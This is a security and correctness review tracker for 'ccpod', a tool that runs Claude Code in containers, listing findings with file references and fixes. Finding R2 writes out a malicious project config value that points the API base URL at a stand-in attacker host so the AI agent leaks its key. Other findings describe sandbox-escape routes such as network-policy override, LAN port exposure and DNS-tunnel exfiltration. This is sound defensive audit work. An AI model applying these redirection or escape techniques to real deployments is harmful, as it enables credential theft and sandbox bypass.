# Code Review Follow-ups

Items identified during the comprehensive code review originally tracked on
branch `claude/comprehensive-code-review-uTT1C` (now deleted; the doc commit
introducing this file is the canonical record). The original branch landed
documentation refreshes and dead-code removal only; the remainder is queued
for follow-up PRs.

Format: each item has `area`, `file:line` references, a short description, and
a concrete suggested fix. Items are grouped by severity. Resolved items are
marked ✅ inline so future readers don't re-verify them.

> ✅ All CRITICAL (C1–C3) and HIGH (H1, H3–H5) security items were addressed in
> the `claude/review-code-items-NoaPZ` branch. See the "Security invariants"
> section of `AGENTS.md` for the resulting trust boundary.

## Next up

Highest-leverage open items, in suggested order:

1. **R1–R3** (2026-07 review) — Untrusted-project trust-boundary escapes:
   network-policy downgrade, `env` API-key redirection, main-container
   `0.0.0.0` port publishing. See the "2026-07 review" section below.
2. **R4** (2026-07 review) — Profile/project `claudeArgs` never reach the
   container (dead config option on `run`/`shell`).
3. **Must-fix #3** — Sidecar startup atomicity / `ensureNetwork` TOCTOU.
4. **Must-fix #7** — `runContainer` "no such container" race (already partly
   mitigated in `ccpod down`; still affects `runContainer` and `shellContainer`).
5. **Must-fix #8** — `computeProjectHash` platform stability (`realpathSync`,
   darwin case-folding).
6. **Must-fix #9** — `writeMergedConfig` rename race / sentinel marker.
7. **M2** — Apply `0o700` to `profilesDir()` and `getStateDir()`.
8. **M3** — Validate `.mcp.json` with Zod and bound port range.

---

## CRITICAL — security (✅ addressed)

### C1. Git ref / repo injection in `simple-git` calls ✅

Zod refinements on `profileConfigSchema.config.{ref,repo}` (see
`src/config/schema.ts`) reject refs starting with `-`, containing `..`, or
holding shell metacharacters, and require repo URLs to use
`https://`, `http://`, `ssh://`, `git://`, or scp-style `user@host:path`.

### C2. Profile install accepts arbitrary URLs ✅

`ccpod profile install <git|url>` now displays the full target and requires
interactive confirmation before fetching. Pass `--yes` / `-y` to bypass for
scripted use. See `src/cli/commands/profile/install.ts`.

### C3. Sidecar host-path mounts escape the sandbox ✅

`mergeConfigs` runs `sanitizeProjectServices` on project-sourced `services`:
rejects host-path volume entries (must be `<named>:<path>` form) and rejects
ports bound to anything except `127.0.0.1` / `localhost` / `::1`; two-part
`host:container` ports are auto-rewritten to bind to `127.0.0.1`. Bracketed
IPv6 is parsed explicitly so `[::1]:host:container` loopback is accepted and
every `::`-expanding wildcard form (`[::]`, `[0::]`, `[::0:0]`,
`[0:0:0:0:0:0:0:0]`, …) is rejected with a clear "all IPv6 interfaces"
message. The profile-level flag `allowProjectHostMounts: true` opts out of
the entire sanitizer.

---

## HIGH — security (✅ addressed)

### H1. Env interpolation exfiltrates arbitrary host env vars ✅

`resolveEnvForwarding` accepts `${VAR}` interpolation only for profile- and
CLI-sourced entries. Project-sourced entries with `${...}` throw immediately;
bare `KEY` forwarding and `KEY=literal` continue to work.

### H3. Updater performs no integrity verification ✅

`release.yml` now publishes a `SHASUMS256.txt` asset (`sha256sum` of each
binary). `downloadAndReplace` fetches `SHASUMS256.txt` and the asset in
parallel, then streams the response body through `createHash('sha256')` into
a write pipeline — the hash is computed as bytes arrive and nothing is
buffered, so a 50–80 MB binary never lives twice in memory. The computed
digest is compared to the entry for the current platform's asset before
`renameSync`. A release without `SHASUMS256.txt`, a missing entry, or a
mismatch is refused with a clear error.

### H4. `auth.keyFile` follows arbitrary host paths ✅

`auth.keyFile` is restricted at the schema level to paths under `~/.ccpod/`
(typically `~/.ccpod/credentials/<profile>/...`); paths containing `..` are
rejected. At read time `resolveAuth` `realpathSync`-es the path and re-checks
containment so a symlink under `~/.ccpod/` cannot redirect to `/etc/shadow`
(or `~/.aws/credentials`, etc.). Users with keys stored elsewhere should use
`keyEnv` instead.

### H5. Project `init` runs arbitrary shell in-container without trust opt-in ✅

Project-level `init:` is ignored unless the profile sets
`allowProjectInit: true`. A one-line `console.warn` is emitted whenever
project init commands are silently dropped.

---

## MEDIUM — security

- ✅ **M1.** Addressed. `writeMergedConfig` now `lstat`-s the deterministic
  `outDir` before reuse and refuses it if it is a symlink, not a directory,
  or owned by a different uid (`src/config/writer.ts:87-107`). Residue: an
  attacker running under the *same* uid (compromised earlier ccpod run,
  shared CI uid) could still pre-seed the deterministic path with a
  malicious `settings.json` before first use, since the cache short-circuit
  returns without verifying contents. Close together with Must-fix #9
  (sentinel marker / per-pid temp dir).
- **M2.** Partially addressed. `credentialsBase()` now uses `mode: 0o700`
  (`src/profile/manager.ts:34`), but `profilesDir()` (line 33) and
  `getStateDir()` (line 57) still create with default modes. Apply 0o700 to
  both.
- **M3.** `.mcp.json` parser does not validate parsed structure with Zod and does
  not bound port range or count (`src/mcp/parser.ts:14-24,33`). A malicious
  `.mcp.json` could conflict with privileged host ports. Fix: validate via Zod;
  cap servers and require port in 1024-65535.
- **M4.** *(intentionally skipped during the original review — kept for stable
  numbering.)*
- **M5.** `removeSidecarNetwork` swallows exit codes (`src/container/sidecars.ts:47-49`)
  — silent failures.

---

## MUST-FIX — correctness

1. ✅ **`ccpod down` mismanages sidecar networks** — addressed. `down.ts`
   collects every `ccpod.project` label touched by the run, then only removes
   each `ccpod-net-<hash>` once no containers reference that hash. `--all`
   now cleans networks per project. As a bonus the inspect-per-container
   loop is collapsed to a single `docker ps --format` round-trip.
2. ✅ **No SIGINT / SIGTERM handlers in headless run** — addressed.
   `src/cli/commands/run.ts:installSignalForwarding` registers SIGINT/SIGTERM
   handlers that issue `docker stop -t 5 <name>` for the active container
   in headless mode. TTY mode relies on docker's existing forwarding; a
   second Ctrl+C re-arms the default handler so it kills ccpod immediately.
3. **Sidecar startup is not atomic** (`src/container/sidecars.ts:30-44`). Partial
   failure leaves containers running and the network in place. Also `ensureNetwork`
   has a TOCTOU race for concurrent `ccpod run` invocations. Fix: treat
   "already exists" as success; on per-service failure, tear down services started
   so far.
4. ✅ **`${VAR:-default}` empty-string fallback** — addressed.
   `interpolateHostEnv` now matches POSIX: when the syntax is `:-`, fall
   back on `default` whenever the host value is unset **or** empty
   (`src/auth/resolver.ts:53-77`). Existing tests updated; new coverage for
   empty + empty-default.
5. ✅ **`isNewer` pre-release / 2-component tags** — addressed.
   `src/update/checker.ts:41-64` now parses with
   `/^v?(\d+)(?:\.(\d+))?(?:\.(\d+))?/`, treating missing parts as 0 and
   silently ignoring pre-release/build suffixes. New tests cover `v1.2.3-rc1`,
   `v2.0`, and unparseable input.
6. ✅ **`downloadAndReplace` tmp cleanup + EXDEV** — addressed.
   `src/update/updater.ts` now wraps the rename in try/finally and falls back
   to copy+unlink on EXDEV (`updater.ts:160-180`). Note: explicit
   ETXTBSY/EBUSY messaging on macOS is **not** added — the rmSync still cleans
   up, but the surfaced error is generic. Leave open as a polish item if
   noisy in practice.
7. **`runContainer` race when container removed concurrently**
   (`src/container/runner.ts:27-34`). `docker rm` "no such container" is fatal.
   Same in `shellContainer`. Fix: treat "no such container" stderr as success.
8. **`computeProjectHash` is not platform-stable**
   (`src/container/builder.ts:24-26`). Case-insensitive macOS HFS+, symlinks,
   and realpath variations produce different hashes for the same dir, yielding
   duplicate stopped containers. Fix: `realpathSync(projectDir)`; normalize case
   on darwin.
9. **`writeMergedConfig` race** (`src/config/writer.ts:88-119`). Two concurrent
   runs can race on rename; reader may see a half-populated mount. Fix: write
   a sentinel marker file last and poll for it on rename failure, or use a
   per-pid temp dir.
10. ✅ **`computeProjectHash` reinvented inline in down** — addressed.
    `src/cli/commands/down.ts` now imports `computeProjectHash` from
    `src/container/builder.ts` instead of duplicating the inline sha256
    truncation.

---

## SHOULD-FIX — correctness

- **Git ref as commit SHA fails** — `git clone --depth 1 --branch <sha>` is
  invalid (`src/profile/git-sync.ts:18`). Detect SHA-shaped refs and fall back
  to clone-then-checkout.
- **Partial clone leaves corrupt configDir** — next run sees `existsSync` and
  skips, then fetch fails. Fix: `rmSync(configDir, {recursive, force})` on clone
  failure.
- **`mergeConfigs` array concat duplicates** in `network.allow` and similar
  (`src/config/merger.ts:43`). Dedupe arrays in `customMerge`.
- **`services` deep-merge replaces wholesale** instead of merging per-service
  fields (`src/config/merger.ts:50-53`). Surprises users who only want to add
  one env var.
- **`parseMcpJson` silently swallows JSON errors** (`src/mcp/parser.ts:19-23`).
  Log a warning.
- **MCP ports not range-validated** (`src/mcp/parser.ts:33`); container start
  fails late.
- **`detectSource` misclassifies `github.com/.../raw/...` URLs as git**
  (`src/profile/installer.ts`). Fix: prefer `.git` suffix; raw.githubusercontent.com
  hosts should be `url`.
- **Oauth credential presence is not validated** in headless mode
  (`src/cli/commands/_setup.ts:88-97`). Container fails opaquely with no auth.

---

## DRY / Maintainability

- **Three near-identical docker-arg builders** in `container/runner.ts:100-145`,
  `container/sidecars.ts:89-117`, and `cli/commands/down.ts:28-30`. Extract
  `flagPairs(flag, kv)` and `flagList(flag, values)` helpers in a new
  `src/container/dockerArgs.ts`.
- **Three duplicate `docker inspect --format ...` call sites** in `runner.ts`,
  `sidecars.ts`, and `down.ts`. Canonical implementation: `containerState` at
  `runner.ts:84`. Reuse it everywhere; expose a `containerInfo()` helper that
  returns name+status in a single inspect call (halves docker round-trips in
  `down.ts`).
- **Two identical `arrayMerge` closures** in
  `src/cli/commands/_setup.ts:130-148`. Hoist to a module-level constant.
- **Identical ZodError formatting** in `src/cli/commands/run.ts:114-120` and
  `src/cli/commands/shell.ts:58-64`. Extract `handleCliError(err)`.
- **`readIfExists` / `readJsonIfExists` duplicated** across
  `src/cli/commands/_setup.ts:200-213` and `src/cli/commands/config/show.ts:107-109`.
  Move to `src/util/fs.ts`.
- **Hand-written `ProfileConfig` / `ProjectConfig` interfaces in
  `src/types/index.ts`** parallel Zod schemas in `src/config/schema.ts` and
  will drift. Replace with `z.infer<typeof profileConfigSchema>`. Remove the
  `as ProfileConfig` cast at `src/config/loader.ts:13`.
- **Five unchecked `JSON.parse … as` sites:** `src/cli/commands/ps.ts:56`,
  `src/cli/commands/_setup.ts:209`, `src/mcp/parser.ts:20`,
  `src/update/checker.ts:26`, `src/update/updater.ts:34-37`. Define Zod
  schemas for each.
- **`init/wizard.ts` is 751 lines.** Split into `src/init/steps/auth.ts`,
  `src/init/steps/image.ts`, etc. The auth detection logic belongs in
  `src/auth/detector.ts`, not init.
- **`_setup.ts:setupContainer` is a 175-line 9-stage pipeline** that owns
  orchestration plus business logic for every stage. Split each stage into a
  named function.
- **Library code does `console.warn`** in `src/auth/resolver.ts:26,50`. Return
  warnings to the caller; let the CLI layer render them.
- **Magic strings duplicated everywhere:** `/workspace`, `/ccpod/config`,
  `/ccpod/credentials`, `/ccpod/plugins`, `/ccpod/state`, hash truncation
  length `16`, container/network/volume prefixes (`ccpod-net-`, `ccpod-svc-`,
  `ccpod-plugins-`, `ccpod-tmp-`), default git ref `'main'`. Move to
  `src/constants.ts`. (Partial: `src/constants.ts` exists but only holds
  GitHub URL constants; the container-path/prefix set is still scattered.)
- **Naming inconsistencies:** `profileName` vs `name` vs `profile`; `cwd` vs
  `projectDir` vs `workdir`; `mergedConfigDir` vs `outDir`. Pick one and apply
  consistently.
- **`mergeConfigs` has two structurally identical return branches**
  (`src/config/merger.ts:13-30` and `:65-81`). Compute variant parts up-front
  then return one object.
- **`container/builder.ts` couples downward** to `profile/manager` and
  `runtime/detector`. Pass resolved paths/runtime as inputs instead.
- **No centralized logger.** Mix of `console.log` / `chalk.dim` / `process.stdout.write`
  across all command modules. Add `src/util/logger.ts` with `info/warn/error/dim/success`
  and a `--quiet` / `--json` mode.
- **No centralized error handling.** 39 ad-hoc `process.exit(1)` sites; only
  two commands render Zod errors nicely. Define `class CcpodError extends Error`
  and route all CLI errors through a single top-level handler.

---

## Performance

- ✅ **`src/update/updater.ts` streaming** — addressed. Body is now piped
  through `node:stream/promises::pipeline` while the SHA-256 hash is computed
  incrementally; nothing is buffered.
- **`src/image/downloader.ts:36-52`** fetches Dockerfile + entrypoint
  sequentially. `Promise.all` them.
- **`src/config/writer.ts:hashProfileDir` (~line 35)** walks the entire profile
  config dir including `mtimeMs` on every run. Caches break on `git checkout`.
  Re-think: either content-hash small files, or drop directory hashing.
- ✅ **`src/cli/commands/down.ts`** — addressed (partial). The two-inspect
  loop is replaced by a single `docker ps --format` round-trip that returns
  id, name, status, and project label in one shot. The actual stop/rm calls
  are still sequential — `Promise.all`-ing them is a future optimization
  but is rarely the bottleneck.
- **`src/container/sidecars.ts:30-44`** starts sidecars sequentially. Parallelize.

---

## Test coverage gaps

- `src/container/sidecars.ts` — no tests for network race or partial-failure
  rollback.
- `src/update/updater.ts` — no tests for EXDEV / ETXTBSY paths.
- SIGINT handling in headless `ccpod run` — no tests for
  `installSignalForwarding` in `src/cli/commands/run.ts`. The handler is
  fire-and-forget and hard to assert on without spawning a real subprocess;
  consider a child-process integration test.
- `src/cli/commands/{down,ps}.ts`, `src/cli/commands/state/clear.ts`,
  `src/plugins/*` — no tests.
- ✅ `interpolateHostEnv` — addressed.
  `tests/unit/auth/resolver.test.ts` covers empty-string fallback for `:-`
  (Must-fix #4).
- ✅ `isNewer` — addressed.
  `tests/unit/update/checker.test.ts` covers pre-release tags, 2-component
  versions, and unparseable input (Must-fix #5).
- `detectSource` — missing `raw.githubusercontent.com` and
  `github.com/.../raw/...` cases.

---

## Documentation

- `ProfileConfig.description` is written by the wizard
  (`src/init/wizard.ts:578`) and documented in profile examples, but **never
  read** anywhere in `src/` or `tests/`. The annotation comment claims it is
  "shown in `ccpod profile list`" but `src/cli/commands/profile/list.ts` does
  not display it. Either wire it into `profile list` (preferred) or remove the
  field entirely from schema, types, and docs.
- ✅ **Broken contributor instruction** — addressed. The commit checklist in
  `AGENTS.md` (line 115) now references the harness's built-in code reviewer
  (`code-reviewer` / `general-purpose`) instead of the unregistered
  `feature-dev:code-reviewer`.

---

## 2026-07 review — additional findings

Second-pass review (four parallel subsystem reviewers over config/auth,
container/runtime, profile/update/image, and CLI commands, plus a manual pass
over the Docker/CI/packaging surface). Items prefixed `R#`. Several strong
claims were verified empirically or against source and are noted as such.
Overlaps with the items above are cross-referenced rather than restated.

### HIGH — untrusted project-config trust-boundary escapes

The `.ccpod.yml` trust boundary in `AGENTS.md` hardens `services`, `env`
interpolation, host mounts, and `init`, but three other project-controlled
channels have no gate. Each lets a cloned repo escalate past a control the
profile owner set. Only `isolation: true` profiles are unaffected.

- **R1. Project config can disable the profile's `restricted` network
  sandbox.** `src/config/merger.ts:152-155`. `network = deepmerge(profile.network,
  project.network)` (default strategy) lets a repo's `.ccpod.yml` set
  `network: {policy: full}` overriding a profile's `restricted`, or append
  hosts to `allow` (deepmerge concatenates arrays). The `override` branch
  (`NETWORK_DEFAULTS.policy = 'full'`) has the same hole. `builder.ts:76`
  then skips `NET_ADMIN`/`CCPOD_NETWORK_POLICY` entirely, so the iptables
  lockdown never applies. Fix: take `network.policy`/`allow` from the profile
  only, or gate project `network` behind a profile opt-in flag as `init`/host
  mounts are.

- **R2. Project `env` can redirect the API key to an attacker.**
  `src/auth/resolver.ts:103-107`, wired at `src/cli/commands/_setup.ts:99-106`.
  Project `env` entries pass through as literal `KEY=value` with no key-name
  filter (only `${VAR}` interpolation is blocked — the H1 fix). `authEnv` only
  ever sets `ANTHROPIC_API_KEY`, so a repo shipping
  `env: [ANTHROPIC_BASE_URL=https://attacker]` (or `HTTPS_PROXY=...`) lands it
  in the container and Claude sends the profile's key to the attacker. Defeats
  the H4 keyFile hardening, since the key leaks after resolution. For oauth
  profiles the repo can even inject its own `ANTHROPIC_API_KEY`. Fix: denylist
  auth/proxy-redirecting keys (`ANTHROPIC_BASE_URL`, `ANTHROPIC_API_KEY`,
  `HTTPS_PROXY`, `HTTP_PROXY`, `NO_PROXY`, …) for project-sourced env.

- **R3. Main-container ports publish on `0.0.0.0`, including untrusted ports.**
  `src/config/merger.ts:157-161` + `parsePorts`, `src/cli/commands/_setup.ts:79,185`,
  `src/container/builder.ts:63-66`, `runner.ts:106-110`. Sidecar ports are
  forced to `127.0.0.1` (C3), but the main container's ports go through
  `parsePorts` (integers only, no host IP) and emit bare `-p host:container`
  → all interfaces. Two untrusted inputs feed it: project `ports.list` and
  `.mcp.json` auto-detected HTTP ports. A malicious repo exposes the Claude
  container (workspace + mounted credentials) to the LAN. `parsePorts` also
  rejects any IP prefix, so nobody can opt into loopback. Fix: apply the same
  `127.0.0.1:` localization to main-container project ports.

### HIGH — correctness (features silently dead / broken)

- **R4. Profile/project `claudeArgs` are discarded on every run** (verified
  against source). `src/cli/commands/_setup.ts:181` —
  `claudeArgs: args.claudeArgs ?? partial.claudeArgs`. `run.ts` and `shell.ts`
  always pass a (possibly empty) array, and `[] ?? x === []`, so the merged
  profile+project `claudeArgs` (`merger.ts:170-173`, with tests) never reach
  the container — including the wizard's own `["--model", ...]` example. Fix:
  `[...partial.claudeArgs, ...(args.claudeArgs ?? [])]`.

- **R5. `ccpod run -- <flags>` passthrough is double-parsed** (verified: citty
  0.2.2 yields `{prompt:"--verbose"}` for `rawArgs:['--','--verbose']`).
  `src/cli/commands/run.ts:89-106`. citty parses post-`--` tokens as the
  `prompt` positional *and* run.ts re-extracts them from `process.argv`, so
  they double-apply: `run -- --verbose` silently goes headless (`tty=false`)
  and passes `--verbose` twice; `run -- --model opus` hard-errors on the bare
  `opus`. Fix: derive the prompt from pre-`--` argv only.

- **R6. Profile git-sync breaks for tags or changed refs** (verified: exit 128,
  `unknown revision`). `src/profile/git-sync.ts:29-30`. After a shallow
  single-branch clone, a later `fetch origin <tag>` only updates `FETCH_HEAD`,
  so `git reset --hard origin/<tag>` (or a since-edited `ref`) fails and aborts
  `ccpod run` on every sync. Fix: `reset --hard FETCH_HEAD`. (Related to the
  SHOULD-FIX "Git ref as commit SHA fails" item, but distinct.)

- **R7. `ccpod update` copy-fallback fails on the running binary** (verified:
  `ETXTBSY`). `src/update/updater.ts:169`. Extends Must-fix #6: the EXDEV
  fallback `copyFileSync(tmp, targetPath)` opens the live executable for write
  → `ETXTBSY` on Linux (tmpfs-`/tmp` hosts: Fedora/Arch), so the update can
  never complete and `update.ts` surfaces a raw stack. Fix: copy to
  `${targetPath}.new` in the target dir, then `renameSync` over it (atomic,
  same filesystem).

### MEDIUM

- **R8. API key visible in `docker run` cmdline.** `src/container/builder.ts:68`
  → `src/container/runner.ts:96` emit `-e ANTHROPIC_API_KEY=sk-...`, readable
  via `ps`/`/proc/*/cmdline` for the whole TTY session — contradicts the
  project's multi-user threat model (writer.ts uid checks). Fix: `-e KEY`
  (inherit from spawn env) or `--env-file`.
- **R9. Restricted network is fail-open.** `docker/entrypoint.sh`. Every
  iptables rule including the final `DROP` ends in `|| true`, so if iptables
  is missing/fails the container runs fully open while printing "restricted
  network active". Also IPv4-only (no `ip6tables` — IPv6 egress unfiltered)
  and port 53 is allowed to any destination (DNS-tunnel exfil). Fix: fail
  closed (exit if the DROP rule can't be installed); filter IPv6; scope DNS.
- **R10. `install.sh` skips checksum verification.** The in-app updater
  verifies SHA-256 against `SHASUMS256.txt` (H3), but the curl-pipe installer
  downloads and `chmod +x` with no verification despite the release publishing
  that asset. Fix: fetch `SHASUMS256.txt` and verify before `mv`.
- **R11. CLI profile names bypass `NAME_RE`; `profile delete` does recursive
  deletes on unvalidated joined paths.** `src/profile/manager.ts:42,72-83`
  (`getProfileDir`/`deleteProfile` raw-`join`), reached from `delete.ts`,
  `create.ts`, and `--profile` in `run`/`state clear`. Only YAML/export/install
  paths validate. `ccpod profile delete '../x'` `rmSync(recursive)`s a
  traversed path (gated only by a `profile.yml` existing there). Self-inflicted
  but contradicts the "enforced at parse time" invariant. Fix: apply `NAME_RE`
  in `getProfileDir`/`deleteProfile` or at each CLI entry.
- **R12. Uppercase profile name breaks image build.** `src/image/hash.ts:16` +
  `src/config/schema.ts` name regex allows `A-Z`, but `computeLocalImageTag`
  embeds the name verbatim in a Docker tag, which must be lowercase →
  `ccpod run`/`image build` fail with "repository name must be lowercase".
  Fix: `.toLowerCase()` in the tag (hash already disambiguates).
- **R13. `portBindings` keyed by container port drops colliding mappings.**
  `src/container/builder.ts:63-66`. Colliding container ports overwrite
  silently, and `.mcp.json` ports (appended last, `_setup.ts:185`) can override
  a profile's declared host-port mapping. Fix: key by host:container pair, or
  detect collisions.
- **R14. `ssh.mountSshDir` is non-functional.** `src/container/builder.ts:50`
  mounts host `~/.ssh` at `/root/.ssh:ro`, but `entrypoint.sh` drops to the
  `node` user (`HOME=/home/node`), which reads `/home/node/.ssh` and can't
  traverse root-owned `/root` → git-over-SSH fails publickey. Fix: mount at
  `/home/node/.ssh` (and chown/relax perms appropriately).
- **R15. Headless run attaches to a running interactive container.**
  `src/container/runner.ts:22-24`. `ccpod run --file task.md` while an
  interactive session is open silently `docker attach`es (discarding the new
  spec/prompt), and its signal forwarding can then `docker stop` the user's
  live session. Fix: in headless mode, don't attach to a pre-existing
  interactive container — error or run a fresh one.
- **R16. `image build` and `run` build the same tag from different contexts.**
  `src/cli/commands/image/build.ts:66-68` uses `cwd`; `_setup.ts:163-167` uses
  `dirname(dockerfileAbs)`. `computeLocalImageTag` hashes Dockerfile content
  only, so whichever builds first wins the tag and the other reuses a
  divergently-built image; editing `entrypoint.sh` also never triggers a
  rebuild on `run`. Fix: unify the context; include context-file digests in
  the tag.

### LOW

- **R17.** `ccpod down --all --profile X` silently ignores `--profile` and
  removes every ccpod container (`src/cli/commands/down.ts:33` — filter only
  added when `!args.all`). Warn or honor the filter.
- **R18.** `config show` masks only env keys containing "key"/"token"
  (`src/cli/commands/config/show.ts:49`); `PASSWORD`/`SECRET`/`CREDENTIALS`
  names print in cleartext, including `--json`. Broaden the mask list.
- **R19.** `containerState` maps anything not `running` to `stopped`
  (`src/container/runner.ts:83`); paused/restarting containers then fail
  `docker rm` (no `-f`) and `ccpod run` throws a misleading error. Handle
  paused/restarting like `down.ts` does.
- **R20.** `auth.keyFile` is always rejected when `~/.ccpod` is itself a
  symlink (`src/auth/resolver.ts:37-43` compares `realpathSync(keyPath)`
  against a non-realpath'd home). Fails closed. Fix: `realpathSync` the home
  dir before comparing.
- **R21.** `loadGlobalConfig` swallows all YAML parse errors and reverts to
  defaults (`src/global/config.ts:24-28`), silently re-enabling
  `autoCheckUpdates` on a typo. Emit a stderr warning.
- **R22.** Sidecar `rm` result is ignored (`src/container/sidecars.ts:92`); a
  paused/restarting sidecar fails `rm` silently and the next `run` fails with
  a name conflict. (Sibling of M5.)
- **R23.** `DOCKER_SOCKET_PATH` override is silently outranked by an installed
  OrbStack (`src/runtime/detector.ts:9-16`) — it only substitutes into the
  lower-ranked `docker` candidate. An explicit env override should win.
- **R24.** `ccpod update` run via `bun run dev` replaces the user's `bun`
  binary (`src/cli/commands/update.ts:45` uses `process.execPath`). Guard:
  refuse when not a compiled `ccpod` build.
- **R25.** `detectSource` misclassifies `github.com/.../blob/...` file URLs as
  git clones (`src/profile/installer.ts:35`). (Same class as the SHOULD-FIX
  `raw/...` item — fix together.)
- **R26.** `getStateDir` creates `~/.ccpod/state/<profile>` with default (0755)
  perms while credentials use 0700 (`src/profile/manager.ts:56`). Duplicate of
  **M2** — close together.
- **R27.** Wizard emits unquoted YAML for values with a leading `"`/`'`, and
  `keyEnv` unquoted (`src/init/wizard.ts:559-598`) → unparseable `profile.yml`.
  Broaden `q()`'s quote-trigger class.
- **R28.** `profile/lock.ts` is a last-sync timestamp, not a mutex; concurrent
  first-runs of the same git profile race on `git clone` into the same dir
  (loser dies "destination path already exists"). (Related to Must-fix #3 and
  the SHOULD-FIX partial-clone item.)

### Verified clean (probed, not skipped)

IPv6 port classifier (`::`, `[::]`, IPv4-mapped, zero-group and zone-ID forms
all rejected), named-volume regex, git repo/ref option-injection guards, the
`--file` traversal check, the updater's SHA-256 verify wiring (mismatch
provably never touches the target), `writeMergedConfig` symlink/uid
revalidation, and the array-based (shell-free) docker/git argv construction all
held up under focused probing.
